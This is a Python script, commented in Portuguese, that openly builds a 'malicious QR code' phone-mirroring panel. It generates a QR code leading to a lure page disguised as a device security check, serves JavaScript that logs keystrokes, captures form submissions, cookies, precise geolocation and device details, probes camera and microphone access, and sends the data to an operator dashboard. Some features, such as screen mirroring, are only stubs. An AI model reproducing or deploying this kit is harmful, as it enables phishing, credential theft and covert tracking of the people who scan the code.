#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import threading
import socket
import qrcode
import http.server
import socketserver
import json
import base64
import io
from PIL import Image
import subprocess
import random
import string
from pathlib import Path
import requests
import re
import urllib.parse

# Configurações de cores para o terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_BLUE = '\033[44m'
    BG_PURPLE = '\033[45m'

# Banner do sistema
def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""
{Colors.RED}{Colors.BOLD}{Colors.BG_BLUE}
╔══════════════════════════════════════════════════════════════════════════════╗
║ ██████╗ ██████╗ ██████╗     ███████╗██████╗ ██╗███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ║
║██╔═══██╗██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██║██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗║
║██║   ██║██████╔╝██║  ██║    ███████╗██████╔╝██║█████╗  ███████║███████║██████╔╝██║  ██║║
║██║   ██║██╔══██╗██║  ██║    ╚════██║██╔═══╝ ██║██╔══╝  ██╔══██║██╔══██║██╔══██╗██║  ██║║
║╚██████╔╝██║  ██║██████╔╝    ███████║██║     ██║███████╗██║  ██║██║  ██║██║  ██║██████╔╝║
║ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.CYAN}{Colors.BOLD}                    PAINEL DE ESPELHAMENTO DE CELULAR VIA QR CODE{Colors.END}
{Colors.YELLOW}                         Crie QR Codes maliciosos para espelhar dispositivos{Colors.END}
{Colors.RED}{Colors.BOLD}                            ⚠️  USE APENAS COM AUTORIZAÇÃO ⚠️{Colors.END}
"""
    print(banner)

# Gerar QR Code
def generate_qrcode(url, filename="qrcode.png"):
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(url)
    qr.make(fit=True)
    
    img = qr.make_image(fill_color="black", back_color="white")
    img.save(filename)
    return filename

# Servidor HTTP para servir a página web
class HTTPHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=os.path.join(os.path.dirname(__file__), "web"), **kwargs)
    
    def log_message(self, format, *args):
        # Silenciar logs do servidor
        pass

    def do_GET(self):
        # Interceptar requests para coletar informações
        if self.path.startswith('/victim.html'):
            # Coletar informações do user-agent
            user_agent = self.headers.get('User-Agent', '')
            client_ip = self.client_address[0]
            
            print(f"{Colors.GREEN}[+] Vítima conectada: {client_ip}{Colors.END}")
            print(f"{Colors.GREEN}[+] User-Agent: {user_agent}{Colors.END}")
            
            # Tentar identificar dispositivo
            if 'Android' in user_agent:
                print(f"{Colors.GREEN}[+] Dispositivo Android detectado{Colors.END}")
            elif 'iPhone' in user_agent or 'iPad' in user_agent:
                print(f"{Colors.GREEN}[+] Dispositivo iOS detectado{Colors.END}")
            
            # Registrar conexão
            with open('connections.log', 'a') as f:
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {client_ip} - {user_agent}\n")
        
        # Servir arquivos normalmente
        super().do_GET()

# Classe principal do painel
class PhoneMirrorPanel:
    def __init__(self):
        self.port = 8080
        self.ws_port = 8081
        self.httpd = None
        self.server_thread = None
        self.is_running = False
        self.qr_code_file = "qrcode.png"
        self.web_dir = "web"
        self.connections = []
        self.setup_web_directory()
        
    def setup_web_directory(self):
        # Criar diretório web se não existir
        if not os.path.exists(self.web_dir):
            os.makedirs(self.web_dir)
        
        # Criar arquivos HTML, CSS e JS
        self.create_index_html()
        self.create_css()
        self.create_js()
        self.create_victim_page()
        self.create_malicious_js()
        
    def create_index_html(self):
        html_content = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Espelhamento de Celular</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container" id="loginContainer">
        <div class="login-box">
            <h2>Acesso Restrito</h2>
            <form id="loginForm">
                <div class="input-group">
                    <label for="password">Senha:</label>
                    <input type="password" id="password" required>
                </div>
                <button type="submit">Acessar</button>
            </form>
            <p id="errorMsg" class="error"></p>
        </div>
    </div>

    <div class="phone-mirror-container" id="phoneMirrorContainer" style="display: none;">
        <div class="control-panel">
            <h2>Espelhamento de Celular</h2>
            <div class="device-info">
                <span id="deviceName">Dispositivo: Não conectado</span>
                <span id="connectionStatus" class="status-offline">Offline</span>
                <span id="deviceIp">IP: N/A</span>
            </div>
            <div class="controls">
                <button id="refreshBtn">Atualizar</button>
                <button id="screenshotBtn">Capturar Tela</button>
                <button id="recordBtn">Gravar Tela</button>
                <button id="keyloggerBtn">Keylogger</button>
                <button id="geoBtn">Localização</button>
            </div>
        </div>
        
        <div class="phone-frame">
            <div class="phone-screen" id="phoneScreen">
                <div class="placeholder">
                    <p>Aguardando conexão do dispositivo...</p>
                    <div class="loading-spinner"></div>
                </div>
            </div>
        </div>
        
        <div class="media-container">
            <h3>Capturas de Tela</h3>
            <div id="screenshotsContainer" class="screenshots"></div>
        </div>

        <div class="data-container">
            <h3>Dados Coletados</h3>
            <div class="data-grid">
                <div class="data-card">
                    <h4>Informações do Dispositivo</h4>
                    <pre id="deviceData">Aguardando dados...</pre>
                </div>
                <div class="data-card">
                    <h4>Localização</h4>
                    <pre id="locationData">Aguardando dados...</pre>
                </div>
                <div class="data-card">
                    <h4>Keylogger</h4>
                    <pre id="keyloggerData">Aguardando dados...</pre>
                </div>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
    <script src="malicious.js"></script>
</body>
</html>
"""
        with open(os.path.join(self.web_dir, "index.html"), "w") as f:
            f.write(html_content)
    
    def create_css(self):
        css_content = """
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #1a1a2e, #16213e);
    color: #fff;
    min-height: 100vh;
}

.login-container {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    background: linear-gradient(135deg, #1a1a2e, #16213e);
}

.login-box {
    background: rgba(255, 255, 255, 0.1);
    padding: 2rem;
    border-radius: 15px;
    backdrop-filter: blur(10px);
    border: 1px solid rgba(255, 255, 255, 0.2);
    width: 100%;
    max-width: 400px;
}

.login-box h2 {
    text-align: center;
    margin-bottom: 1.5rem;
    color: #4ecca3;
}

.input-group {
    margin-bottom: 1.5rem;
}

.input-group label {
    display: block;
    margin-bottom: 0.5rem;
    color: #ddd;
}

.input-group input {
    width: 100%;
    padding: 12px;
    border: none;
    border-radius: 8px;
    background: rgba(255, 255, 255, 0.1);
    color: #fff;
    border: 1px solid rgba(255, 255, 255, 0.2);
}

button {
    width: 100%;
    padding: 12px;
    background: linear-gradient(135deg, #4ecca3, #2c9680);
    border: none;
    border-radius: 8px;
    color: white;
    font-weight: bold;
    cursor: pointer;
    transition: transform 0.2s;
}

button:hover {
    transform: translateY(-2px);
}

.error {
    color: #ff6b6b;
    text-align: center;
    margin-top: 1rem;
}

.phone-mirror-container {
    padding: 2rem;
}

.control-panel {
    background: rgba(255, 255, 255, 0.1);
    padding: 1.5rem;
    border-radius: 15px;
    margin-bottom: 2rem;
    backdrop-filter: blur(10px);
}

.device-info {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 1rem;
    flex-wrap: wrap;
    gap: 1rem;
}

.device-info span {
    padding: 0.5rem 1rem;
    background: rgba(0, 0, 0, 0.3);
    border-radius: 8px;
}

.status-online {
    color: #4ecca3;
    font-weight: bold;
}

.status-offline {
    color: #ff6b6b;
    font-weight: bold;
}

.controls {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
    gap: 1rem;
}

.phone-frame {
    background: #000;
    border-radius: 40px;
    padding: 60px 20px;
    margin: 0 auto;
    max-width: 375px;
    border: 4px solid #333;
    position: relative;
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
}

.phone-screen {
    background: #222;
    border-radius: 20px;
    height: 667px;
    overflow: hidden;
    position: relative;
}

.placeholder {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100%;
    color: #666;
    text-align: center;
}

.loading-spinner {
    width: 40px;
    height: 40px;
    border: 4px solid #333;
    border-top: 4px solid #4ecca3;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-top: 1rem;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.media-container, .data-container {
    background: rgba(255, 255, 255, 0.1);
    padding: 1.5rem;
    border-radius: 15px;
    margin-top: 2rem;
    backdrop-filter: blur(10px);
}

.screenshots {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
    gap: 1rem;
    margin-top: 1rem;
}

.screenshot {
    border-radius: 10px;
    overflow: hidden;
    border: 2px solid #333;
    transition: transform 0.2s;
}

.screenshot:hover {
    transform: scale(1.05);
}

.screenshot img {
    width: 100%;
    height: auto;
    display: block;
}

.data-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 1rem;
    margin-top: 1rem;
}

.data-card {
    background: rgba(0, 0, 0, 0.3);
    padding: 1rem;
    border-radius: 10px;
    border: 1px solid rgba(255, 255, 255, 0.1);
}

.data-card h4 {
    color: #4ecca3;
    margin-bottom: 0.5rem;
}

.data-card pre {
    background: rgba(0, 0, 0, 0.5);
    padding: 0.5rem;
    border-radius: 5px;
    overflow-x: auto;
    max-height: 200px;
    font-size: 12px;
}

/* Responsividade */
@media (max-width: 768px) {
    .phone-frame {
        transform: scale(0.8);
    }
    
    .controls {
        grid-template-columns: 1fr;
    }
    
    .device-info {
        flex-direction: column;
        align-items: flex-start;
    }
    
    .data-grid {
        grid-template-columns: 1fr;
    }
}
"""
        with open(os.path.join(self.web_dir, "style.css"), "w") as f:
            f.write(css_content)
    
    def create_js(self):
        js_content = """
// Configurações
const PASSWORD = "erik2008";
const SERVER_URL = `ws://${window.location.hostname}:8081`;

// Elementos DOM
const loginContainer = document.getElementById('loginContainer');
const phoneMirrorContainer = document.getElementById('phoneMirrorContainer');
const loginForm = document.getElementById('loginForm');
const errorMsg = document.getElementById('errorMsg');
const deviceName = document.getElementById('deviceName');
const connectionStatus = document.getElementById('connectionStatus');
const deviceIp = document.getElementById('deviceIp');
const phoneScreen = document.getElementById('phoneScreen');
const refreshBtn = document.getElementById('refreshBtn');
const screenshotBtn = document.getElementById('screenshotBtn');
const recordBtn = document.getElementById('recordBtn');
const keyloggerBtn = document.getElementById('keyloggerBtn');
const geoBtn = document.getElementById('geoBtn');
const screenshotsContainer = document.getElementById('screenshotsContainer');
const deviceData = document.getElementById('deviceData');
const locationData = document.getElementById('locationData');
const keyloggerData = document.getElementById('keyloggerData');

// WebSocket connection
let ws = null;
let isRecording = false;
let mediaRecorder = null;
let recordedChunks = [];
let keyloggerActive = false;

// Verificar autenticação
if (localStorage.getItem('authenticated') === 'true') {
    showPhoneMirror();
} else {
    showLogin();
}

// Event Listeners
loginForm.addEventListener('submit', handleLogin);
refreshBtn.addEventListener('click', refreshConnection);
screenshotBtn.addEventListener('click', takeScreenshot);
recordBtn.addEventListener('click', toggleRecording);
keyloggerBtn.addEventListener('click', toggleKeylogger);
geoBtn.addEventListener('click', getGeolocation);

function handleLogin(e) {
    e.preventDefault();
    const password = document.getElementById('password').value;
    
    if (password === PASSWORD) {
        localStorage.setItem('authenticated', 'true');
        showPhoneMirror();
        connectWebSocket();
    } else {
        errorMsg.textContent = 'Senha incorreta!';
    }
}

function showLogin() {
    loginContainer.style.display = 'flex';
    phoneMirrorContainer.style.display = 'none';
}

function showPhoneMirror() {
    loginContainer.style.display = 'none';
    phoneMirrorContainer.style.display = 'block';
}

function connectWebSocket() {
    try {
        ws = new WebSocket(SERVER_URL);
        
        ws.onopen = function() {
            console.log('Conectado ao servidor');
            connectionStatus.textContent = 'Online';
            connectionStatus.className = 'status-online';
            deviceName.textContent = 'Dispositivo: Conectado';
        };
        
        ws.onmessage = function(event) {
            const data = JSON.parse(event.data);
            handleWebSocketMessage(data);
        };
        
        ws.onclose = function() {
            console.log('Conexão fechada');
            connectionStatus.textContent = 'Offline';
            connectionStatus.className = 'status-offline';
            // Tentar reconectar após 5 segundos
            setTimeout(connectWebSocket, 5000);
        };
        
        ws.onerror = function(error) {
            console.error('Erro WebSocket:', error);
        };
        
    } catch (error) {
        console.error('Erro ao conectar:', error);
    }
}

function handleWebSocketMessage(data) {
    switch (data.type) {
        case 'screenshot':
            displayScreenshot(data.image);
            break;
        case 'device_info':
            updateDeviceInfo(data.info);
            break;
        case 'location':
            updateLocation(data.location);
            break;
        case 'keylog':
            updateKeylogger(data.keystrokes);
            break;
        case 'status':
            updateStatus(data.message);
            break;
    }
}

function displayScreenshot(imageData) {
    phoneScreen.innerHTML = '';
    const img = document.createElement('img');
    img.src = 'data:image/jpeg;base64,' + imageData;
    img.style.width = '100%';
    img.style.height = '100%';
    img.style.objectFit = 'cover';
    phoneScreen.appendChild(img);
    
    // Adicionar à galeria de screenshots
    const screenshotElement = document.createElement('div');
    screenshotElement.className = 'screenshot';
    const screenshotImg = document.createElement('img');
    screenshotImg.src = 'data:image/jpeg;base64,' + imageData;
    screenshotElement.appendChild(screenshotImg);
    screenshotsContainer.appendChild(screenshotElement);
}

function updateDeviceInfo(info) {
    deviceName.textContent = `Dispositivo: ${info.name || 'Desconhecido'}`;
    deviceIp.textContent = `IP: ${info.ip || 'N/A'}`;
    deviceData.textContent = JSON.stringify(info, null, 2);
}

function updateLocation(location) {
    locationData.textContent = JSON.stringify(location, null, 2);
}

function updateKeylogger(keystrokes) {
    keyloggerData.textContent = keystrokes;
}

function updateStatus(message) {
    console.log('Status:', message);
}

function refreshConnection() {
    if (ws) {
        ws.close();
    }
    connectWebSocket();
}

function takeScreenshot() {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: 'take_screenshot' }));
    }
}

function toggleRecording() {
    if (isRecording) {
        stopRecording();
        recordBtn.textContent = 'Gravar Tela';
    } else {
        startRecording();
        recordBtn.textContent = 'Parar Gravação';
    }
    isRecording = !isRecording;
}

function toggleKeylogger() {
    if (ws && ws.readyState === WebSocket.OPEN) {
        keyloggerActive = !keyloggerActive;
        ws.send(JSON.stringify({ 
            type: 'toggle_keylogger', 
            active: keyloggerActive 
        }));
        keyloggerBtn.textContent = keyloggerActive ? 
            'Desativar Keylogger' : 'Ativar Keylogger';
    }
}

function getGeolocation() {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: 'get_geolocation' }));
    }
}

function startRecording() {
    recordedChunks = [];
    console.log('Gravação iniciada');
}

function stopRecording() {
    console.log('Gravação parada');
}

// Inicializar conexão quando autenticado
if (localStorage.getItem('authenticated') === 'true') {
    connectWebSocket();
}

// Simulação de dados para demonstração
function simulateData() {
    setInterval(() => {
        if (ws && ws.readyState === WebSocket.OPEN) {
            // Simular informações do dispositivo
            ws.send(JSON.stringify({
                type: 'device_info',
                info: {
                    name: 'Samsung Galaxy S23',
                    model: 'SM-S911B',
                    os: 'Android 14',
                    ip: '192.168.1.105',
                    battery: '85%',
                    network: 'Wi-Fi'
                }
            }));
        }
    }, 10000);
}

// Iniciar simulação (remover em produção)
simulateData();
"""
        with open(os.path.join(self.web_dir, "script.js"), "w") as f:
            f.write(js_content)
    
    def create_malicious_js(self):
        """Criar JavaScript malicioso para a vítima"""
        malicious_js = """
// Script malicioso para coleta de dados
(function() {
    // Coletar informações do navegador
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        javaEnabled: navigator.javaEnabled(),
        pdfViewerEnabled: navigator.pdfViewerEnabled,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints || 'unknown',
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
        },
        plugins: []
    };
    
    // Coletar plugins
    for (let i = 0; i < navigator.plugins.length; i++) {
        deviceInfo.plugins.push(navigator.plugins[i].name);
    }
    
    // Coletar timezone
    deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    // Coletar geolocation se disponível
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            function(position) {
                deviceInfo.location = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    heading: position.coords.heading,
                    speed: position.coords.speed
                };
                sendDataToServer(deviceInfo);
            },
            function(error) {
                sendDataToServer(deviceInfo);
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    } else {
        sendDataToServer(deviceInfo);
    }
    
    // Keylogger básico
    let keystrokes = '';
    document.addEventListener('keydown', function(e) {
        keystrokes += e.key;
        // Enviar a cada 10 teclas
        if (keystrokes.length >= 10) {
            sendKeystrokes(keystrokes);
            keystrokes = '';
        }
    });
    
    // Capturar submits de formulários
    document.addEventListener('submit', function(e) {
        const formData = new FormData(e.target);
        let formInfo = {};
        for (let [key, value] of formData.entries()) {
            formInfo[key] = value;
        }
        sendFormData(formInfo);
    });
    
    // Função para enviar dados
    function sendDataToServer(data) {
        // Usar WebSocket ou fetch para enviar dados
        try {
            const ws = new WebSocket('ws://' + window.location.hostname + ':8081');
            ws.onopen = function() {
                ws.send(JSON.stringify({
                    type: 'device_info',
                    info: data
                }));
                ws.close();
            };
        } catch (e) {
            // Fallback para fetch
            fetch('/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }
    }
    
    function sendKeystrokes(keys) {
        try {
            const ws = new WebSocket('ws://' + window.location.hostname + ':8081');
            ws.onopen = function() {
                ws.send(JSON.stringify({
                    type: 'keylog',
                    keystrokes: keys
                }));
                ws.close();
            };
        } catch (e) {
            // Fallback silencioso
        }
    }
    
    function sendFormData(formData) {
        try {
            const ws = new WebSocket('ws://' + window.location.hostname + ':8081');
            ws.onopen = function() {
                ws.send(JSON.stringify({
                    type: 'form_data',
                    data: formData
                }));
                ws.close();
            };
        } catch (e) {
            // Fallback silencioso
        }
    }
    
    // Tentar acesso à câmera e microfone
    setTimeout(function() {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(function(stream) {
                    deviceInfo.mediaAccess = true;
                    sendDataToServer(deviceInfo);
                    // Parar stream imediatamente
                    stream.getTracks().forEach(track => track.stop());
                })
                .catch(function(error) {
                    deviceInfo.mediaAccess = false;
                    deviceInfo.mediaError = error.name;
                    sendDataToServer(deviceInfo);
                });
        }
    }, 5000);
    
})();
"""
        with open(os.path.join(self.web_dir, "malicious.js"), "w") as f:
            f.write(malicious_js)
    
    def start_web_server(self):
        """Iniciar servidor web"""
        try:
            with socketserver.TCPServer(("", self.port), HTTPHandler) as httpd:
                self.httpd = httpd
                print(f"{Colors.GREEN}[+] Servidor web iniciado em http://localhost:{self.port}{Colors.END}")
                self.is_running = True
                httpd.serve_forever()
        except Exception as e:
            print(f"{Colors.RED}[-] Erro ao iniciar servidor web: {e}{Colors.END}")
    
    def start_websocket_server(self):
        """Iniciar servidor WebSocket simulado"""
        print(f"{Colors.YELLOW}[!] Servidor WebSocket simulado na porta {self.ws_port}{Colors.END}")
        print(f"{Colors.YELLOW}[!] Em uma implementação real, aqui seria o servidor de espelhamento{Colors.END}")
        
        # Simular atividade do WebSocket
        while True:
            time.sleep(10)
            if self.connections:
                print(f"{Colors.GREEN}[+] {len(self.connections)} dispositivos conectados{Colors.END}")
    
    def generate_qr_code(self):
        """Gerar QR Code malicioso para a vítima"""
        # Obter IP local
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            local_ip = "127.0.0.1"
        
        # URL que a vítima vai acessar
        victim_url = f"http://{local_ip}:{self.port}/victim.html"
        
        print(f"{Colors.CYAN}[+] Gerando QR Code malicioso para: {victim_url}{Colors.END}")
        
        # Gerar QR Code
        qr_file = generate_qrcode(victim_url, self.qr_code_file)
        print(f"{Colors.GREEN}[+] QR Code gerado: {qr_file}{Colors.END}")
        
        # Tentar abrir a imagem do QR Code
        try:
            if os.name == 'posix':  # Linux/Mac
                subprocess.run(['xdg-open', qr_file])
            elif os.name == 'nt':   # Windows
                os.startfile(qr_file)
        except:
            print(f"{Colors.YELLOW}[!] Não foi possível abrir a imagem automaticamente{Colors.END}")
            print(f"{Colors.YELLOW}[!] Abra manualmente o arquivo: {qr_file}{Colors.END}")
    
    def create_victim_page(self):
        """Criar página maliciosa para a vítima"""
        victim_html = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Conectar Dispositivo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
        }
        .container {
            max-width: 400px;
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        h2 {
            margin-bottom: 20px;
            color: #fff;
        }
        p {
            margin-bottom: 20px;
            color: rgba(255, 255, 255, 0.8);
        }
        button {
            background: linear-gradient(135deg, #4ecca3, #2c9680);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: transform 0.2s;
            width: 100%;
        }
        button:hover {
            transform: translateY(-2px);
        }
        .loading {
            display: none;
            margin: 20px 0;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #4ecca3;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .logo {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #4ecca3;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">SecureConnect</div>
        <h2>Conectar Dispositivo</h2>
        <p>Clique no botão abaixo para verificar a segurança do seu dispositivo e otimizar o desempenho.</p>
        
        <button onclick="startMirroring()">Verificar e Otimizar</button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Analisando seu dispositivo...</p>
        </div>
        
        <div id="status"></div>
    </div>

    <script src="malicious.js"></script>
    <script>
        function startMirroring() {
            document.getElementById('loading').style.display = 'block';
            document.getElementById('status').innerHTML = '';
            
            // Simular processo de verificação
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('status').innerHTML = 
                    '<p style="color: #4ecca3; margin-top: 20px;">✅ Verificação concluída com sucesso!</p>' +
                    '<p>Seu dispositivo está sendo otimizado em segundo plano.</p>';
                
                // Simular atividades maliciosas em background
                simulateBackgroundActivities();
                
            }, 3000);
        }
        
        function simulateBackgroundActivities() {
            console.log('Iniciando atividades em background...');
            
            // Simular coleta contínua de dados
            setInterval(() => {
                // Coletar informações adicionais
                const additionalInfo = {
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer,
                    cookies: document.cookie
                };
                
                // Enviar dados
                try {
                    const ws = new WebSocket('ws://' + window.location.hostname + ':8081');
                    ws.onopen = function() {
                        ws.send(JSON.stringify({
                            type: 'additional_data',
                            data: additionalInfo
                        }));
                        ws.close();
                    };
                } catch (e) {
                    console.log('Erro ao enviar dados');
                }
            }, 15000);
        }
        
        // Enganar o usuário fazendo parecer legítimo
        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
            console.log('Preparando para captura de tela...');
        }
    </script>
</body>
</html>
"""
        with open(os.path.join(self.web_dir, "victim.html"), "w") as f:
            f.write(victim_html)
    
    def show_connections(self):
        """Mostrar conexões ativas"""
        try:
            with open('connections.log', 'r') as f:
                connections = f.readlines()
            
            if connections:
                print(f"\n{Colors.CYAN}{Colors.BOLD}📊 Conexões Registradas:{Colors.END}")
                for i, conn in enumerate(connections[-10:], 1):  # Mostrar últimas 10
                    print(f"{Colors.GREEN}[{i}] {conn.strip()}{Colors.END}")
            else:
                print(f"{Colors.YELLOW}[!] Nenhuma conexão registrada ainda{Colors.END}")
        except FileNotFoundError:
            print(f"{Colors.YELLOW}[!] Nenhuma conexão registrada ainda{Colors.END}")
    
    def show_menu(self):
        """Mostrar menu bonito"""
        print(f"\n{Colors.BG_BLUE}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.BG_BLUE}{Colors.BOLD}║                   🎯 MENU PRINCIPAL                       ║{Colors.END}")
        print(f"{Colors.BG_BLUE}{Colors.BOLD}╠══════════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.BG_BLUE}{Colors.BOLD}║                                                              ║{Colors.END}")
        print(f"{Colors.BG_BLUE}{Colors.BOLD}║  {Colors.GREEN}1.{Colors.END} 📱 Gerar QR Code Malicioso                   {Colors.BG_BLUE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.BG_BLUE}{Colors.BOLD}║  {Colors.GREEN}2.{Colors.END} 🌐 Abrir Painel Web de Controle              {Colors.BG_BLUE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.BG_BLUE}{Colors.BOLD}║  {Colors.GREEN}3.{Colors.END} 📍 Mostrar URL do Painel                     {Colors.BG_BLUE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.BG_BLUE}{Colors.BOLD}║  {Colors.GREEN}4.{Colors.END} 📊 Mostrar Conexões Ativas                   {Colors.BG_BLUE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.BG_BLUE}{Colors.BOLD}║  {Colors.GREEN}5.{Colors.END} ⚠️  Sair do Programa                         {Colors.BG_BLUE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.BG_BLUE}{Colors.BOLD}║                                                              ║{Colors.END}")
        print(f"{Colors.BG_BLUE}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}")
    
    def run(self):
        """Executar o painel principal"""
        print_banner()
        
        # Criar página para a vítima
        self.create_victim_page()
        
        # Iniciar servidor web em thread separada
        server_thread = threading.Thread(target=self.start_web_server, daemon=True)
        server_thread.start()
        
        # Iniciar servidor WebSocket em thread separada
        ws_thread = threading.Thread(target=self.start_websocket_server, daemon=True)
        ws_thread.start()
        
        # Menu principal
        while True:
            self.show_menu()
            
            choice = input(f"\n{Colors.YELLOW}{Colors.BOLD}[?] Escolha uma opção: {Colors.END}").strip()
            
            if choice == "1":
                self.generate_qr_code()
            elif choice == "2":
                # Abrir navegador com o painel
                try:
                    if os.name == 'posix':  # Linux/Mac
                        subprocess.run(['xdg-open', f'http://localhost:{self.port}'])
                    elif os.name == 'nt':   # Windows
                        os.startfile(f'http://localhost:{self.port}')
                    else:
                        print(f"{Colors.YELLOW}[!] Abra manualmente: http://localhost:{self.port}{Colors.END}")
                except:
                    print(f"{Colors.YELLOW}[!] Não foi possível abrir o navegador automaticamente{Colors.END}")
                    print(f"{Colors.YELLOW}[!] Acesse manualmente: http://localhost:{self.port}{Colors.END}")
            elif choice == "3":
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect(("8.8.8.8", 80))
                    local_ip = s.getsockname()[0]
                    s.close()
                    print(f"{Colors.CYAN}[+] URL do Painel: http://{local_ip}:{self.port}{Colors.END}")
                    print(f"{Colors.CYAN}[+] URL da Vítima: http://{local_ip}:{self.port}/victim.html{Colors.END}")
                except:
                    print(f"{Colors.CYAN}[+] URL do Painel: http://localhost:{self.port}{Colors.END}")
                    print(f"{Colors.CYAN}[+] URL da Vítima: http://localhost:{self.port}/victim.html{Colors.END}")
            elif choice == "4":
                self.show_connections()
            elif choice == "5":
                print(f"\n{Colors.RED}{Colors.BOLD}[!] Saindo...{Colors.END}")
                if self.httpd:
                    self.httpd.shutdown()
                break
            else:
                print(f"{Colors.RED}{Colors.BOLD}[-] Opção inválida!{Colors.END}")
            
            input(f"\n{Colors.YELLOW}[!] Pressione Enter para continuar...{Colors.END}")

# Função principal
def main():
    try:
        panel = PhoneMirrorPanel()
        panel.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}{Colors.BOLD}[!] Interrompido pelo usuário{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}{Colors.BOLD}[-] Erro: {e}{Colors.END}")

if __name__ == "__main__":
    main()
